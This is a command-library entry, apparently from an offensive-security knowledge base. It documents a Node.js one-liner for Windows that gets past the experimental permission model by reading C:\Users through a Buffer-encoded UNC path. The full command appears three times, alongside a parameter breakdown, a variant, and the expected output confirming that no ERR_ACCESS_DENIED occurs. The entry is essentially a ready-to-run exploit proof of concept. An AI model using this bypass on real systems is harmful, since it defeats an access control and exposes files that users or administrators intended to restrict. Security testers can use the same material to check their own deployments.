---
data: >-
  node --experimental-permission --allow-fs-read=C:\\* -p
  "fs.readdirSync(Buffer.from('\\\\A\\\\C:\\Users'))"
tags:
  - node.js
  - bypass
  - unc
type: command
executor: bash
platforms:
  - Windows
id: f7e78c0e-23da-48c0-a8b7-a571e0462f04
created_at: '2025-12-14T17:29:57.154Z'
updated_at: '2025-12-14T17:29:57.154Z'
verified: false
validated: true
submitted: true
---
# node-experimental-permission-unc-bypass

## Command

```bash
node --experimental-permission --allow-fs-read=C:\\* -p "fs.readdirSync(Buffer.from('\\\\A\\\\C:\\Users'))"
```

## Description

This command launches Node.js with the experimental permission model enabled, restricts file system reads to C:\\* paths, and attempts to synchronously read a directory using a Buffer-encoded UNC path, demonstrating a permission bypass vulnerability on Windows.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--experimental-permission` | Enables Node.js's experimental permission system for granular FS access control | Yes |
| `--allow-fs-read=C:\\*` | Grants read access only to paths matching the C:\\* pattern (local drive) | Yes |
| `-p` | Evaluates and prints the result of the provided JavaScript expression | Yes |
| `fs.readdirSync(Buffer.from('\\\\A\\\\C:\\Users'))` | Reads the directory at the Buffer-decoded UNC path \\A\\C:\\Users | Yes |

## Examples

### Basic Usage

```bash
node --experimental-permission --allow-fs-read=C:\\* -p "fs.readdirSync(Buffer.from('\\\\A\\\\C:\\Users'))"
```

### Advanced Usage

```bash
node --experimental-permission --allow-fs-read=C:\\* -p "console.log(fs.readdirSync(Buffer.from('\\\\A\\\\C:\\Users')));"
```

## Expected Output

An array of directory contents from the UNC path, such as ['Public', 'Default', 'Administrator'], confirming the bypass. No error like 'ERR_ACCESS_DENIED' should occur.

## Related

- [[procedures/Reproduce-Node.js-UNC-Path-Permission-Bypass]]
